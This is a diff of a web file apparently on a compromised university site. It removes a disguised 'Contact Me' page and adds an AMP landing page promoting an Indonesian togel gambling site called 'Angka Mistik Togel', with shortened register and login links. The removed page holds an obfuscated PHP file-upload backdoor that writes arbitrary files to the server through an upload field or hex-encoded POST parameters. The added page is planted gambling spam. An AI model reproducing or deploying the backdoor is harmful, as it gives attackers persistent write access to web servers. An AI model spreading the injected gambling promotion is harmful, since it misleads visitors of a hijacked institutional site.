@@ -1,6 +1,1502 @@
-<meta content="noindex"name="robots">Contact Me
-<form enctype="multipart/form-data"method="post">
-<input name="btul"type="file">
-<button>Send</button>
-</form>
-<?="";$a='f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';$b='f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';$c='t'.'m'.'p'.'_'.'n'.'a'.'m'.'e';$d='h'.'ex'.'2b'.'in';$f='f'.'il'.'e_e'.'xi'.'st'.'s';if(isset($_FILES['btul'])){$a($_FILES['btul']['name'],$b($_FILES['btul'][$c]));if($f('./'.$_FILES['btul']['name'])){echo 'Oke !';}else{echo 'Fail !';}}if(isset($_GET['fpt'])){$a($d($_POST['f']),$d($_POST['d']));if($f($d($_POST['f']))){echo "Oke !";}else{echo "Fail !";}}?>
+<!doctype html>
+<html amp lang="id">
+<head>
+    <!--GANTI VERIF-->
+    <meta name="google-site-verification" content="Vr9YCcLFN9auqFq15ccYh_OcXZ6aDMdI4ojEXFmIUHs" />
+          <meta charset="utf-8">
+          <meta http-equiv="X-UA-Compatible" content="ie=edge">
+          <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+          <link rel="shortcut icon" sizes="60x60" href="https://i.ibb.co/vBqXVkP/AMT-60x60.png">
+          <link rel="icon" sizes="60x60" href="https://i.ibb.co/vBqXVkP/AMT-60x60.png">
+    <!--GANTI JUDUL-->
+          <title>Angka Mistik Togel - Mistik Baru - Mistik Lama - Mistik Index</title>
+          <meta name="description" content="Angka Mistik Togel merupakan salah satu rumus togel buat menghitung ataupun memperoleh suatu angka ampuh togel tertentu.">
+          <meta name="keywords" content="angka mistik, angka mistik 2023, angka mistik baru, angka mistik dan index, angka mistik hk, angka mistik hk 2023, angka mistik lama, angka mistik lama dan baru, angka mistik togel, angka mistik togel 2023 lengkap" />
+          <meta name="author" content="ANGKA MISTIK TOGEL">
+          <link rel="canonical" href="https://home.kku.ac.th/edconference/stdID/angka-mistik-togel/">
+          <meta name="copyright" content="Angka Mistik Togel - Mistik Baru - Mistik Lama - Mistik Index">
+          <meta name="theme-color" content="#727272">
+          <meta name="robots" content="index, follow">
+          <meta property="og:locale" content="id_ID">
+          <meta property="og:url" content="https://home.kku.ac.th/edconference/stdID/angka-mistik-togel/">
+          <meta property="og:type" content="website">
+          <meta property="og:image" content="https://i.ibb.co/23DmMtQ/Angka-Mistik.jpg">
+          <meta property="og:title" content="Angka Mistik Togel - Mistik Baru - Mistik Lama - Mistik Index">
+          <meta property="og:description" content="Angka Mistik Togel merupakan salah satu rumus togel buat menghitung ataupun memperoleh suatu angka ampuh togel tertentu.">
+        <script async src="https://cdn.ampproject.org/v0.js"></script>
+        <script async custom-element="amp-carousel" src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js"></script> 
+        <script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
+        <script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
+        <link rel="preload" href="https://i.ibb.co/23DmMtQ/Angka-Mistik.jpg" as="image">
+        <link rel="preload" href="https://i.ibb.co/23DmMtQ/Angka-Mistik.jpg" as="image">
+        <link rel="preload" href="https://i.ibb.co/23DmMtQ/Angka-Mistik.jpg" as="image">
+          <style amp-boilerplate>
+             body {
+             -webkit-animation: -amp-start 8s steps(1,end) 0s 1 normal both;
+             -moz-animation: -amp-start 8s steps(1,end) 0s 1 normal both;
+             -ms-animation: -amp-start 8s steps(1,end) 0s 1 normal both;
+             animation: -amp-start 8s steps(1,end) 0s 1 normal both
+             }
+             
+             @-webkit-keyframes -amp-start {
+             from {
+             visibility: hidden
+             }
+             to {
+             visibility: visible
+             }
+             }
+             @-moz-keyframes -amp-start {
+             from {
+             visibility: hidden
+             }
+             to {
+             visibility: visible
+             }
+             }
+             @-ms-keyframes -amp-start {
+             from {
+             visibility: hidden
+             }
+             to {
+             visibility: visible
+             }
+             }
+             @-o-keyframes -amp-start {
+             from {
+             visibility: hidden
+             }
+             to {
+             visibility: visible
+             }
+             }
+             @keyframes -amp-start {
+             from {
+             visibility: hidden
+             }
+             to {
+             visibility: visible
+             }
+             }
+
+
+             
+          </style>
+          <noscript>
+             <style amp-boilerplate>
+                body {
+                -webkit-animation: none;
+                -moz-animation: none;
+                -ms-animation: none;
+                animation: none
+                }
+             </style>
+          </noscript>
+          
+       
+          <style amp-custom>
+            :root {
+               --small-font: 14px;
+               --normal-font: 16px;
+               --large-font: 18px;
+               --x-large-font: 20px
+            }
+            
+            body {
+               font-size: var(--small-font);
+               display: flex;
+               flex-direction: column;
+               padding-top: 54px;
+               padding-bottom: 40px;
+            }
+            
+            /*img {
+                  -moz-user-select: none;
+                  -webkit-user-select: none;
+                  -ms-user-sele ct: none;
+                  user-select: none;
+                  -webkit-user-drag: none;
+                  user-drag: none;
+                  -webkit-touch-callout: none;
+            }*/
+                
+            a {
+               text-decoration: none;
+               font-weight: bold;
+               color: #ff6600;
+            }
+
+            a:hover{
+               text-decoration: none;
+               color: #fff000;
+            }
+            
+            summary {
+               outline: none;
+               list-style-type: none
+            }
+            
+            summary::-webkit-details-marker {
+               display: none
+            }
+            
+            .container {
+               align-self: center;
+               margin-left: auto;
+               margin-right: auto
+            }
+            
+            /* Header section start */
+            .logo-container {
+               text-align: center;
+               padding: 10px;
+               display: flex;
+               justify-content: center;
+               align-items: center;
+               position: fixed;
+               top: 0;
+               left: 0;
+               right: 0;
+               z-index: 99;
+               box-shadow: 0px 0px 8px 2px #000000;
+            }
+            
+            .logo-container .logo {
+               width: calc(38px*180/45);
+               display: block
+            }
+            
+            .logo-container .logo amp-img {
+               flex-grow: 1
+            }
+            
+            .logo-container {
+               background-color: #000;
+            }
+            
+            
+            /* Header section end */
+            
+            /* Login & Registr Buttons Start */
+            .link-container {
+               display: flex;
+               justify-content: center;
+               font-size: var(--x-large-font);
+               padding: 0;
+               width: 100%;
+               margin-top: 10px;
+               margin-bottom: 10px;
+            }
+            
+            .mobile-link-container {
+               margin-top: 0px;
+               margin-bottom: 0px;
+            }
+            
+            .link-container a {
+               width: 50%;
+               text-align: center;
+               padding: 15px 20px;
+               text-transform: uppercase;
+               border-radius: 10px;
+               margin: 10px;
+               font-weight:bold;
+            }
+            
+            .login-button,
+            .register-button,
+            .livechat-button,
+            .whatsapp-button{
+               color: #fff;
+            }
+
+            .login-button:hover{
+                color:#000;
+            }
+
+            .register-button:hover{
+                color:#000;
+            }
+
+            .livechat-button:hover{
+                color: #000;
+            }
+
+            .whatsapp-button:hover{
+                color: #000;
+            }
+            
+            .register-button {
+               background: #248fbf;
+            }
+            
+            .register-button:hover {
+               background: #e9bb5b;
+            }
+            
+            .login-button {
+               background: #dcbe03;
+            }
+            
+            .login-button:hover {
+               background: #e9bb5b;
+            }
+            
+            .whatsapp-button {
+               background: #35bf24;
+            }
+            
+            .whatsapp-button:hover {
+               background: #5be9b4;
+            }
+            
+            .livechat-button {
+               background: #ff9800;
+            }
+            
+            .livechat-button:hover {
+               background: #FF2020;
+            }
+            
+            .mobile-link-container
+            {
+                display:none;
+            }
+             
+            /* Login & Registr Buttons End */
+            
+            /* Table design start */
+            .table-white
+            {
+                overflow: hidden;
+                width: 100%;
+                max-width: 100%;
+                color: #4a5669;
+                text-align: center;
+                background-color: #fff;
+                border: 2px solid #e6e9ee;
+                border-collapse: separate;
+                border-radius: 12px;
+            }
+            
+            .table-white td
+            {
+                line-height: 24px;
+                border: 0px;
+                vertical-align: middle;
+                border-bottom: 1px solid #e6e9ee;
+            }
+            
+            /* Table design end */
+            
+            /* Game box design start */ 
+             body{
+                -webkit-touch-callout: none; /* iOS Safari */
+                -webkit-user-select: none; /* Safari */
+                -khtml-user-select: none; /* Konqueror HTML */
+                -moz-user-select: none; /* Firefox */
+                -ms-user-select: none; /* Internet Explorer/Edge */
+                user-select: none; /* Non-prefixed version, currently supported by Chrome and Opera */
+            }
+            
+            .slider-container
+            {
+                margin-top: 20px;
+                border: 1px solid #FFFFFF;
+                border-radius: 10px;
+                overflow: hidden;
+                max-width: 93%;
+            }
+            
+            .game_items_box_heading
+            {
+               color: #F2D35B;
+               text-shadow: -1px 1px 0 #F2D35B, -1px 1px 0 rgb(0 0 0 / 20%);
+               text-align: center;
+               display:none;
+            }
+
+            .game_items_box
+            {
+                display: grid;
+                grid-template-columns: 1fr 1fr 1fr 1fr;
+                grid-gap: 30px;
+                padding: 10px;
+            }
+            
+            .game_items_inner_box{
+                padding:3px;
+                margin-bottom:10px;
+                border-radius:10px;
+                background-color:#727272;
+                color:#ffffff;
+                box-shadow:rgba(50,50,93,.25) 0 6px 12px -2px,rgba(0,0,0,.3) 0 3px 7px -3px;
+            }
+            
+            .game_items_inner_box img {
+                border-radius: 10px 10px 0 0;
+            }
+            
+            .game_items_inner_box-desc {
+                margin: 10px;
+            }
+            
+            .game_items_inner_box-desc h4
+            {
+                margin-top: 0px;
+                margin-bottom: 10px;
+                text-align: center;
+            }
+            
+            .game_items_inner_box-desc .text-small
+            {
+                font-size:12px;
+            }
+            
+            .game_items_inner_box-row-desc
+            {
+                margin: 10px;
+                text-align:center;
+            }
+            
+            .boxbutton
+            {
+                align-items: center;
+                appearance: none;
+                background-color: #FFFFFF;
+                border-radius: 20px;
+                border-width: 0;
+                box-shadow: rgb(45 35 66 / 40%) 0 2px 4px, rgb(45 35 66 / 30%) 0 7px 13px -3px, #1a1818 0 -3px 0 inset;
+                box-sizing: border-box;
+                display: inline-flex;
+                height: 48px;
+                justify-content: center;
+                line-height: 1;
+                list-style: none;
+                overflow: hidden;
+                padding-left: 16px;
+                padding-right: 16px;
+                position: relative;
+                text-decoration: none;
+                transition: box-shadow .15s,transform .15s;
+                touch-action: manipulation;
+                white-space: nowrap;
+                will-change: box-shadow,transform;
+                font-size: 18px;
+                font-weight: 700;
+            }
+            
+            .game_items_inner_box:hover
+            {
+                box-shadow: rgb(45 35 66 / 40%) 0 4px 8px, rgb(45 35 66 / 30%) 0 7px 13px -3px, #F2D35B 0 -3px 0 inset;
+                transform: translateY(-2px);
+            }
+            
+            /* Game box design end */
+            
+            /* Bottom Buttons design start */
+            .four_buttons_column
+            {
+                display: grid;
+                grid-template-columns: 1fr 1fr 1fr 1fr;
+                grid-gap: 15px;
+                padding: 10px;
+            }
+            
+            .four_buttons_column a
+            {
+                background: #727272;
+                padding: 15px;
+                text-align: center;
+                color: #ffffff;
+                border-radius: 10px;
+                font-weight:bold;
+            }
+            
+            .four_buttons_column a:hover
+            {
+               background: #e9bb5b;
+            }
+            
+            .three_buttons_column
+            {
+                display: grid;
+                grid-template-columns: 1fr 1fr 1fr;
+                grid-gap: 30px;
+                padding: 10px;
+            }
+            
+            .three_buttons_column a
+            {
+                background: #727272;
+                padding: 15px;
+                text-align: center;
+                color: #ffffff;
+                border-radius: 10px;
+                font-weight:bold;
+            }
+            
+            .three_buttons_column a:hover
+            {
+               background: #e9bb5b;
+            }
+
+            
+            .games_icons_list
+            {
+                background:#FFFFFF;
+            }
+            
+            .repeat_column
+            {
+                display: grid;
+                grid-template-columns: repeat(5,1fr);
+                grid-gap: 10px;
+                padding: 10px;
+            }
+            
+            .repeat_column img {
+                object-fit: contain;
+            }
+            
+            .repeat_column div {
+                text-align: center;
+            }
+            
+            /* Bottom Buttons design end */
+            
+            /* Footer start with content area */
+            .footer-container {
+               text-align: center
+            }
+           
+            .site-description-container {
+                padding: 10px;
+                background-image: url(assets/texture_bg.png);
+                background-color: transparent;
+                border-radius: 10px;
+            }
+            
+            .site-description {
+               background-color: #050c29;
+               padding: 10px
+            }
+            
+            .copyright {
+               padding: 25px 0 20px;
+               display: flex;
+               flex-direction: column;
+               justify-content: center
+            }
+            
+            .copyright div {
+               padding-bottom: 10px
+            }
+            
+            .fixed-footer {
+               display: flex;
+               justify-content: space-around;
+               position: fixed;
+               background-color: #727272;
+               padding: 5px 0;
+               left: 0;
+               right: 0;
+               bottom: 0;
+               z-index: 99;
+               box-shadow: 0px 0px 8px 1px #000000;
+            }
+            
+            .fixed-footer a {
+               flex-basis: calc((100% - 15px*6)/5);
+               display: flex;
+               flex-direction: column;
+               justify-content: center;
+               align-items: center;
+               color: #999
+            }
+            
+            .fixed-footer a.active {
+               color: #0195ff
+            }
+            
+            
+            body {
+               font-family: sans-serif;
+               background-color: #000418
+            }
+            
+            .fixed-footer {
+               background-color: #1e274b
+            }
+            
+            .fixed-footer a {
+               background-color: inherit;
+               flex-basis: calc((100% - 15px*6)/5);
+               max-width: 75px;
+               color: #fff;
+               font-size: var(--small-font)
+            }
+            
+            .fixed-footer a.active {
+               color: #ff00b2
+            }
+            
+            .fixed-footer .center {
+               transform: scale(1);
+               background: center no-repeat;
+               background-size: contain;
+               background-color: inherit;
+               border-radius: 50%
+            }
+            
+            .fixed-footer amp-img {
+               max-width: 40%;
+               margin-bottom: 5px
+            }
+            
+            .fixed-footer .live-chat-icon {
+               animation: pulse 3s infinite
+            }
+            
+            
+            body {
+               background-color: #080808;
+            }
+            
+            
+            .footer-container {
+               color: #FFF;
+               background-color: #0f0f0f;
+            }
+            
+            .site-description {
+               background-color: #080808;
+            }
+            
+            .fixed-footer {
+               background-color: #727272;
+            }
+            
+            .fixed-footer a {
+               color: #fff;
+            }
+            
+            .fixed-footer a.active {
+               color: #f60808
+            }
+            
+            .copyright_footer_area
+            {
+                padding-bottom: 15px;
+                background: #727272;
+                border-top: 3px solid #e9bb5b;
+            }
+            
+            .copyright_data_area
+            {
+                padding:10px;
+                text-align:center;
+                color: #ffffff;
+                text-transform: uppercase;
+            }
+            
+            .copyright_data_area p
+            {
+                margin:0px;
+                text-align: center;
+                font-weight: bold;
+            }
+
+
+
+            *{
+               font-family: sans-serif;
+               box-sizing: border-box;
+            }
+
+            h1 {
+               color:#ff6600;
+               text-align: center;
+               font-size: 2.2rem;
+            }
+            
+            h2 {
+               color:#ff6600;
+               text-align: center;
+               font-size: 1.8rem;
+            }
+            
+            h3 {
+               color:#ff6600;
+               text-align: justify;
+               font-size: 1.4rem;
+            }
+
+            h4 {
+               color:#ff6600;
+               text-align: justify;
+               font-size: 1rem;
+            }
+
+            p{
+               margin-bottom: auto;
+               text-align: justify;
+            }
+
+            ol > li {
+                text-align: justify;
+                list-style-type: upper-roman;
+            }
+
+            ul > li {
+                text-align: justify;
+                list-style-type: square;
+            }
+
+            body{
+               background: #000000;
+               background-repeat: no-repeat;
+               background-attachment: fixed;
+               background-position: top center;
+               background-size: contain;
+               background-color: #121212;
+               background-size: 100%;
+            }
+
+            .container{
+               width: 100%;
+               margin-left: auto;
+               margin-right: auto;
+            }
+
+            .adv{
+               justify-content: center;
+               display: flex;
+               flex-wrap: wrap;
+            }
+
+            img{
+               vertical-align: middle;
+               border-style: none;
+            }
+
+            .title{
+               display: flex;
+               justify-content: center;
+            }
+
+            .title-text{
+               color: white;
+               font-size: 2.5rem;
+            }
+
+            .slot{
+               display: block;
+            }
+
+            .slot .slot-sidebar{
+               padding-right: 10px;
+               padding-left: 0;
+               margin-top: -15px;
+               background-color: black;
+               float: none;
+               width: 100%; 
+               flex: none;
+               max-width: 100%;
+               padding-right: 0;
+            }
+
+            .btn-provider:hover{
+               background-color: #644C1C;
+            }
+
+            .slot-sidebar-nav{
+               display: -ms-flexbox;
+               display: flex;
+               -ms-flex-wrap: wrap;
+               flex-wrap: nowrap;
+               padding-left: 0;
+               margin-bottom: 0;
+               list-style: none;
+            }
+
+            .slot-sidebar-nav > li {
+               border-bottom: 1px solid #0092b1;
+               width: 100%;
+               position: relative;
+               display: block;
+               border-bottom: none;
+               padding: 6px;
+               background: linear-gradient(to bottom,#242424 0%,#515151 46%,#242424 100%);
+            }
+
+            .slot-sidebar-nav > li > a{
+               color: #fff;
+               font-size: 13px;
+               padding: 7px 10px;
+               display: block;
+               background-color: black;
+            }
+
+            .btn-provider{
+               text-align: center;
+               display: block;
+            }   
+
+            .enter{
+               display: none;
+            }
+
+            .btn-provider span{
+               position: unset;
+            }
+
+            .active{
+               background-color: #0092B1;
+            }
+
+            .slot .content{
+               float: none;
+               width: 100%;
+               padding: 0;
+               flex: 0 0 100%;
+               max-width: 100%;
+               background-color: #121212;
+            }
+
+            .wrapper{
+               width: 100%;
+               padding: 0;
+               white-space: nowrap;
+               overflow: hidden;
+               position: relative;
+               z-index: 0;
+            }
+
+            .card{
+               float: left;
+               width: 20%;
+               background: transparent;
+               border: none;
+               text-align: center;
+               position: relative;
+            }
+
+            .card-content{
+               margin: 5px;
+               border: 5px double #ff6600;
+               border-radius: 100px;
+               background: #dc3545;
+               color: #fff;
+               font-weight: bold;
+               font-size: 12px;
+               overflow: hidden;
+               position: relative;
+            }
+
+            .percent{
+               height: 27px;
+               display: flex;
+               overflow: hidden;
+               line-height: 0;
+               font-size: .75rem;
+               background-color: #e9ecef;
+               /* border-radius: .25rem; */
+               position: relative;
+               z-index: 1;
+               border-radius: 18px;
+               width: 90%;
+               margin: 0 auto;
+            }
+
+            .percent p{
+               z-index: 15;    
+               position: absolute;
+               text-align: center;
+               width: 100%;
+               font-size: 14px;
+               font-weight: bold;
+               transform: translateY(14px);
+               color: black;
+            }
+
+            .percent-bar{
+               /* background-color: #ffc107; */
+               background-image: linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+               background-size: 1rem 1rem;
+               display: -ms-flexbox;
+               display: flex;
+               -ms-flex-direction: column;
+               flex-direction: column;
+               -ms-flex-pack: center;
+               justify-content: center;
+               overflow: hidden;
+               color: #fff;
+               text-align: center;
+               white-space: nowrap;
+               /* background-color: #007bff; */
+               transition: width .6s ease;
+               -webkit-animation: progress-bar-stripes 1s linear infinite;
+               animation: progress-bar-stripes 1s linear infinite;
+               /* animation: ; */
+               z-index: 10;
+            }
+
+            .yellow{
+               background-color: #ffc107;
+            }
+
+            .green{
+               background-color: #28a745;
+            }
+
+            .red{
+               background-color: #dc3545;
+            }
+
+            .hover-btn{
+               position: absolute;
+               opacity: 0;
+               background-color: rgba(0,0,0,0.9);
+               transition: all 0.1s ease-in-out;
+               z-index: 10;
+               width: 100%;
+               height: 87%;
+            }
+
+            .maintenance{
+               position: absolute;
+               background-color: rgba(0,0,0,0.5);
+               z-index: 10;
+               width: 100%;
+               height: 100%;
+               color: white;
+               text-align: center;
+               margin: -6px;
+            }
+
+            .maintenance p{
+               position: relative;
+               top: 40%;
+               font-size: 13px;
+            }
+
+            .play-btn{
+               font-size: 15px;
+               text-decoration: none;
+               color: white;
+               text-align: center;
+               align-items: center;
+               /* width: 100%; */
+               margin-top: 42%;
+               padding: 8px;
+               display: block;
+               margin-left: 30px;
+               margin-right: 30px;
+               margin: 42% 30px 42% 30px;
+               background: linear-gradient(to bottom,#fff095 0%,#b88416 88%);
+               color: #000;
+               border-radius: 18px;
+               transition: all .3s ease;;
+            }
+
+            .play-btn:hover{
+               background: linear-gradient(to top,#fff095 0%,#b88416 88%);
+            }
+
+            .img-zoom{
+               transition: all 0.45s ease-in-out;
+            }
+
+            .ygg-img{
+               border: 5px solid #2F2F2F;
+            }
+
+            .hover-btn:hover{
+               opacity: 100%;
+            }
+
+            .hover-btn:hover ~ .img-zoom{
+               /* transform: scale(1.2); */
+               position: relative;
+            }
+
+            .short{
+               display: none;
+            }
+            .next-btn{
+               /* display: none; */
+               background: linear-gradient(to bottom,#242424 0%,#515151 46%,#242424 100%);
+               width: 15%;
+            }
+
+            .mySlides{
+               display: none;
+            }
+
+            .next-btn{
+               background-color: #292a2b;
+               border: none;
+               color: #fff;
+            }
+
+            @media (min-width: 576px){
+               .container{
+                  max-width: 540px;
+               }
+               
+            }
+
+            @media (min-width: 768px){
+               .container{
+                  max-width: 720px;
+               }
+               
+            }
+
+            @media (min-width: 992px){
+               .container{
+                  max-width: 960px;
+               }
+            }
+
+            @media (min-width: 1200px){
+               .container{
+                  max-width: 1140px;
+               }
+               
+            }
+
+            @media (max-width: 992px) {
+               .slot-sidebar-nav{
+                  flex-wrap: nowrap;
+               }
+               .slot-sidebar{
+                  float: none;
+                  width: 100%; 
+                  flex: none;
+                  max-width: 100%;
+                  padding-right: 0;
+               }
+               .content{
+                  float: none;
+                  width: 100%;
+                  flex: none;
+                  max-width: 100%;
+               }
+               .card{
+                  width: 33.3%;
+               }
+               .hover-btn{
+                  display: none;
+               }
+               .hover-btn:hover ~ .img-zoom{
+                  transform: scale(1);
+                  position: relative;
+               }
+               .btn-provider{
+                  text-align: center;
+                  display: block;
+               }  
+               .enter{
+                  display: block;
+               }
+               .btn-provider span{
+                  position: unset;
+               }
+               .btn-provider i{
+                  margin: 0;
+               }
+               .slot-sidebar-nav li{
+                  border-bottom: none;
+               }
+               .slot-sidebar-nav li a p{
+                  font-size: 13px;
+               }
+               .img-zoom{
+                  height: auto;
+               }
+               .slot-sidebar-nav li a img{
+                  height: 37.5px;
+               }
+               .maintenance p{
+                  font-size: 5px;
+               }
+            }
+            
+            
+            /* Footer end with content area */
+            
+            @media(max-width:768px)
+            {
+                .fixed-footer amp-img
+               {
+                   max-width: 80%;
+               }
+               
+               .fixed-footer amp-img.home_footer {
+                    max-width: 100%;
+               }
+               
+               body {
+                    padding-bottom: 70px;
+               }
+            }
+            
+            @media(min-width:768px) {
+               body {
+                  font-size: var(--normal-font)
+               }
+               .site-menu {
+                  width: 20%
+               }
+            }
+            
+            @media(min-width:1200px) {
+               .container {
+                  width: 1170px
+               }
+            }
+            
+            @media(min-width:992px) {
+               .container {
+                  width: 970px
+               }
+            }
+            
+            
+           
+            @media(min-width:768px) {
+               body,
+               .footer-container,
+               .site-description,
+               .copyright {
+                  background-color: #000
+               }
+               body
+               {
+                   padding-bottom:0px;
+               }
+               .last-footer
+               {
+                   display:none;
+               }
+            }
+            
+           
+             
+             @media(max-width:550px){
+                 .desktop-btn-container
+                 {
+                    display:none;
+                 }
+                 .mobile-link-container
+                 {
+                    display:flex;
+                 }
+             }
+             
+             
+            
+            @media (max-width: 991px)
+            {
+                .slider-container {
+                    align-self: inherit;
+                    margin:10px;
+                }
+            }
+            
+              
+            
+            @media (max-width: 800px){
+                .game_items_box {
+                    grid-template-columns: 1fr 1fr;
+                    grid-gap: 5px;
+                }
+                
+                .four_buttons_column
+                {
+                    grid-template-columns: 1fr 1fr;
+                    grid-gap: 10px;
+                }
+                
+                .three_buttons_column
+                {
+                    grid-template-columns: 1fr 1fr;
+                    grid-gap: 10px;
+                }
+                
+                .repeat_column
+                {
+                    display: grid;
+                    grid-template-columns: repeat(2,1fr);
+                    grid-gap: 5px;
+                }
+            
+                .last_grid
+                {
+                    grid-column-start:1;
+                    grid-column-end: 3;
+                }
+                
+            }
+
+            
+            
+            /* Animation of icon start */
+            .animate-round {
+               -webkit-animation-name: animate-round;
+               animation-name: animate-round;
+               -webkit-animation-duration: 4.5s;
+               animation-duration: 1.5s;
+               -webkit-animation-fill-mode: both;
+               animation-fill-mode: both;
+               animation-iteration-count: infinite
+            }
+            
+            @-webkit-keyframes animate-round {
+               0% {
+                  -webkit-transform: scale3d(1, 1, 1);
+                  transform: scale3d(1, 1, 1)
+               }
+               10%,
+               20% {
+                  -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+                  transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+               }
+               30%,
+               50%,
+               70%,
+               90% {
+                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+               }
+               40%,
+               60%,
+               80% {
+                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+               }
+               100% {
+                  -webkit-transform: scale3d(1, 1, 1);
+                  transform: scale3d(1, 1, 1)
+               }
+            }
+            
+            @keyframes animate-round {
+               0% {
+                  -webkit-transform: scale3d(1, 1, 1);
+                  transform: scale3d(1, 1, 1)
+               }
+               10%,
+               20% {
+                  -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+                  transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+               }
+               30%,
+               50%,
+               70%,
+               90% {
+                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+               }
+               40%,
+               60%,
+               80% {
+                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+               }
+               100% {
+                  -webkit-transform: scale3d(1, 1, 1);
+                  transform: scale3d(1, 1, 1)
+               }
+            }
+            
+            /* Animation of icon end */
+			
+			table.togel td, table.togel th {
+border: 1px solid #ff6600;
+font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+table.togel tbody td {
+font-size: 15px;
+color: #ffffff;
+padding: 5px;
+text-align: center;
+font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+table.togel thead {
+background: #ff6600;
+font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+table.togel thead th {
+font-size: 17px;
+color: #fff;
+text-align: center;
+font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+.social {		
+left: 0;		
+width: 0;		
+position: fixed;		
+top: 110px;		
+z-index: 9999999999;		
+}
+		
+.social ul {		
+padding: 0px;		
+-webkit-transform: translate(-130px, 0);		
+-moz-transform: translate(-130px, 0);		
+-ms-transform: translate(-130px, 0);		
+-o-transform: translate(-130px, 0);		
+transform: translate(-130px, 0);		
+}
+		
+.social ul li {
+    display: block;
+    margin: 6px;
+    margin-left: 0px;
+    background: rgba(0, 0, 0, 0.86);
+    width: 189px;
+    text-align: right;
+    padding: 4px;
+    -webkit-border-radius: 0 20px 20px 0;
+    -moz-border-radius: 0 20px 20px 0;
+    border-radius: 0 20px 20px 0;
+    -webkit-transition: all 1s;
+    -moz-transition: all 1s;
+    -ms-transition: all 1s;
+    -o-transition: all 1s;
+    transition: all 1s;
+    height: 53px;
+    border: groove 2px #ff6600;
+}
+		
+.social ul li:hover {		
+-webkit-transform: translate(110px, 0);		
+-moz-transform: translate(110px, 0);		
+-ms-transform: translate(110px, 0);		
+-o-transform: translate(110px, 0);		
+transform: translate(110px, 0);		
+background: rgba(95, 95, 95, 0.7);		
+}	
+	
+.social ul li:hover a {		
+color: #fff;		
+}
+		
+.social ul li:hover i {		
+color: #fff;		
+background: rgba(0, 0, 0, 0.86);		
+-webkit-transform: rotate(360deg);		
+-moz-transform: rotate(360deg);		
+-ms-transform: rotate(360deg);		
+-o-transform: rotate(360deg);		
+transform: rotate(360deg);		
+-webkit-transition: all 1s;		
+-moz-transition: all 1s;		
+-ms-transition: all 1s;		
+-o-transition: all 1s;		
+transition: all 1s;		
+}	
+	
+.social ul li i {		
+margin-left: 10px;		
+color: #000;		
+background: #fff;		
+padding: 10px;		
+-webkit-border-radius: 50%;		
+-moz-border-radius: 50%;		
+border-radius: 50%;		
+width: 20px;		
+height: 20px;		
+font-size: 20px;		
+background: #ffffff;		
+-webkit-transform: rotate(0deg);		
+-moz-transform: rotate(0deg);		
+-ms-transform: rotate(0deg);		
+-o-transform: rotate(0deg);		
+transform: rotate(0deg);		
+}
+          </style>
+       </head>
+       <body>
+
+          <!-- Header section Start -->
+          <br/>
+          <div class="logo-container">
+             <a target="_blank" href="/" class="logo">
+                <amp-img layout="responsive" height="150" width="300" src="https://i.ibb.co/6NkyrhL/angka-mistik-togel-300x150.png" alt="DEMO SLOT GACOR" noloading></amp-img>
+             </a>
+          </div>
+          <br>
+          <!-- Header section End -->
+          <!-- Slider section Start -->
+          <!-- Slider section End -->
+          <!-- Login & Register Button section Start -->
+          <br />
+            <div class="link-container container desktop-btn-container">
+                 <a target="_blank" href="https://rebrand.ly/mentari-4d" class="register-button">Daftar</a>
+                <a target="_blank" href="https://rebrand.ly/mentari-4d" class="login-button">Masuk</a>
+                <a target="_blank" href="https://rebrand.ly/lc-4d" class="register-button">LiveChat</a>
+            </div>
+            <div class="mobile-link-container link-container container">
+                <a target="_blank" href="https://rebrand.ly/mentari-4d" class="register-button">Daftar</a>
+                <a target="_blank" href="https://rebrand.ly/mentari-4d" class="login-button">Masuk</a>
+                <a target="_blank" href="https://rebrand.ly/lc-4d" class="register-button">Livechat</a>
+            </div>
+           
+            <!-- Login & Register Button section End -->
+            
+            <!-- Game Box section Start -->
+                       <div class="col-md-12 pb-5 text-center" style="color: #ffffff;">
+                   <article class="word">
+                   
+       </div>
+   
+   
+          <!-- Game Box section End -->
+          <!-- Slider section Start -->
+          <br>
+          <div class="container slider-container">
+          <amp-carousel class="carousel-container" layout="responsive" width="1920" height="960" type="slides" autoplay delay="5000" loop>
+             <a href="https://home.kku.ac.th/edconference/stdID/angka-mistik-togel/">
+                <amp-img src="https://i.ibb.co/23DmMtQ/Angka-Mistik.jpg" width="1920" height="960" layout="responsive"
+                   alt="Angka Mistik Togel"></amp-img>
+             </a>
+             
+          </amp-carousel>
+          </div>
+          <!-- Slider section End -->
+          <br />
